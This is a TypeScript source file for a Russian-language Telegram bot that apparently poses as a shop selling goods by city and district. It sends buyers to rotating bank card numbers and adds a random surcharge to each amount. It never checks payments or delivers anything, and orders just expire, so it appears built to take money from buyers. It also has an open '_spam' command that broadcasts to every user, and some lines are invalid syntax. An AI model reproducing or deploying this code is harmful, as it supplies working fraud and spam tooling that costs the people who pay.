// @ts-nocheck

import {Bot} from 'grammy'
import {
    addBot,
    itemsBuilder,
    mainCitiesBuilder,
    payOrCancel,
    problemWithPayment,
    regionsBuilder, topUpMethods
} from "./assets/keyboards";

import * as config from "../config"
import {getCities, getOrderNumber} from "./logic";
import {
    CARD_NUMBERS, items,
    ORDER_CANCEL_DELAY,
    PLUS_PERCENT,
    PRICE_PLUS_RANGE,
    RANDOM_CARD_CHOICE
} from "../config";

const bot = new Bot<any>(config.TOKEN)
let users = new Set()
let cardIndex = 0

//@ts-ignore
bot.on('callback_query', (ctx, next) => {
    console.log(ctx.callbackQuery.data)
    next()
})
bot.use((ctx, next) => {
    // @ts-ignore
    users.add(ctx.from.id)
    global[ctx.from.id] = global[ctx.from.id] || {}
    next()
})
bot.on('message', async (ctx, next) => {
    if (global[ctx.from.id]?.lock_position === 'get-spam') {
        global[ctx.from.id]?.lock_position = ''
        ctx.reply('Рассылка запущена!')
        for (const user of users) {
            await ctx.copyMessage(user)
        }
        ctx.reply('Рассылка завершена!')
    } else next()
})
bot.command('_spam', ctx => {
    global[ctx.from.id].lock_position = 'get-spam'
    ctx.reply('Отправьте сообщение для расслыки!')
})
bot.on('message:text', (ctx, next) => {
    if (global[ctx.from.id]?.lock_position === 'get-amount' && Number(ctx.msg.text)) {
        global[ctx.from.id].price = Number(ctx.msg.text)
        global[ctx.from.id].orderNumber = getOrderNumber()
        global[ctx.from.id]?.lock_position = ''
        ctx.reply('Чем вы будете оплачивать:',
            {
                reply_markup: topUpMethods
            })
    } else next()

})
bot.callbackQuery('last-order', ctx => bot.api.answerCallbackQuery(ctx.callbackQuery.id, {
    text: 'У вас нет подтвержденных заказов!',
    show_alert: true
}))
bot.on('callback_query', (ctx, next) => {
    ctx.answerCallbackQuery()
    next()
})

bot.callbackQuery(/itm*/, ctx => {
    const id = ctx.callbackQuery.data.slice(4)

    //city, itemName
    ctx.reply('Выберите район:', {reply_markup: regionsBuilder(global[ctx.from.id]?.city, id)})
})
bot.callbackQuery(/order*/, (ctx: any) => {
    const data = ctx.callbackQuery.data
    const id = data.split('|')[1]
    console.log(id)
    let name
    let price
    console.log(items)
    for (const city of Object.keys(items)) {
        console.log(city, 'djkdfghgklh')
        for (const regionName of Object.keys(items[city])) {
            const region = items[city][regionName]
            for (const item of region) {
                if (item.id === id) {
                    name = item.title
                    price = item.price
                }
            }
        }
    }
    console.log(name, price)
    global[ctx.from.id].buyName = name
    global[ctx.from.id].price = Number(price)
    global[ctx.from.id].orderNumber = getOrderNumber()
    ctx.reply(`Номер покупки № ${global[ctx.from.id].orderNumber}
Товар и объем <b>${name}</b>
Для проведения оплаты нажмите на кнопку ОПЛАТИТЬ
После того, как Вы нажмете кнопку оплаты, у вас есть 30 минут на оплату`, {
        parse_mode: "HTML",
        reply_markup: payOrCancel
    })
})
bot.callbackQuery('balance', async (ctx: any) => {
    const userID = ctx.from.id
    await ctx.reply('Введите сумму на которую вы хотите пополнить баланс')
    global[ctx.from.id].lock_position = 'get-amount'
})
bot.callbackQuery(/pay*/, async (ctx: any) => {
    if (global[ctx.from.id].activeOrder) {
        return ctx.reply('У вас уже создана заявка на пополнение, оплатите или ожидайте отмены!!!')
    }
    await ctx.reply(`✅ ВЫДАННЫЕ РЕКВИЗИТЫ ДЕЙСТВУЮТ 30 МИНУТ
✅ ВЫ ПОТЕРЯЕТЕ ДЕНЬГИ, ЕСЛИ ОПЛАТИТЕ ПОЗЖЕ
✅ ПЕРЕВОДИТЕ ТОЧНУЮ СУММУ. НЕВЕРНАЯ СУММА НЕ БУДЕТ ЗАЧИСЛЕНА.
✅ ОПЛАТА ДОЛЖНА ПРОХОДИТЬ ОДНИМ ПЛАТЕЖОМ.
✅ ПРОБЛЕМЫ С ОПЛАТОЙ? ПЕРЕЙДИТЕ ПО ССЫЛКЕ : @doc_tor001
Предоставить чек об оплате и
ID:  ${ctx.from.id}
✅ С ПРОБЛЕМНОЙ ЗАЯВКОЙ ОБРАЩАЙТЕСЬ НЕ ПОЗДНЕЕ 24 ЧАСОВ С МОМЕНТА ОПЛАТЫ.`, {parse_mode: "HTML"})

    let cardNumber: string
    if (RANDOM_CARD_CHOICE) {
        cardNumber = CARD_NUMBERS[Math.floor(Math.random() * CARD_NUMBERS.length)]
    } else {
        if (cardIndex === CARD_NUMBERS.length) cardIndex = 0
        cardNumber = CARD_NUMBERS[cardIndex++]
    }
    await ctx.reply(`✅Заявка № <b>${global[ctx.from.id].orderNumber}</b>
     Переведите на банковскую  карту ${Math.round(global[ctx.from.id].price * (1 + PLUS_PERCENT / 100) + Math.floor(Math.random() * PRICE_PLUS_RANGE))} рублей удобным для вас способом.  Важно пополнить ровную сумму.
<b>${cardNumber}</b>
‼️ у вас есть 30 мин на оплату, после чего платёж не будет зачислен
‼️ перевёл неточную сумму - оплатил чужой заказ`, {parse_mode: "HTML"})
    await ctx.reply('Если в течении часа средства не выдались автоматически то нажмите на кнопку - "Проблема с оплатой"', {reply_markup: problemWithPayment})
    global[ctx.from.id].activeOrder = true
    setTimeout(() => {
        global[ctx.from.id].activeOrder = false
        ctx.reply(`Ваша заявка ${global[ctx.from.id].orderNumber} отменена`)
    }, ORDER_CANCEL_DELAY * 1000)

})
bot.callbackQuery('my-bots', ctx => {
    ctx.reply('Ваши боты:\n' +
        'У вас нету ботов!', {
        reply_markup: addBot
    })
})

bot.callbackQuery('referral-bots', ctx => {
    ctx.reply('Делитесь своими ботами с друзьями и получайте 100руб. с каждого его оплаченного заказа.\n' +
        'Ваши боты:\n' +
        'У вас нету ботов!', {
        reply_markup: addBot
    })
})
bot.callbackQuery('add-bot', ctx => {
    ctx.reply('Добавление бота доступно от 10-ти покупок')
})
bot.callbackQuery(getCities(), ctx => {
    const data = ctx.callbackQuery.data
    global[ctx.from.id].city = data
    if (!itemsBuilder(data)) {
        return ctx.reply('Товар закончился, зайдите позже')
    }
    ctx.reply('Выберите продукт:', {reply_markup: itemsBuilder(data)})
})


bot.on('message:text', ctx => {
    ctx.reply('Выберите город:', {
        reply_markup: mainCitiesBuilder()
    })
})
bot.start()



process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)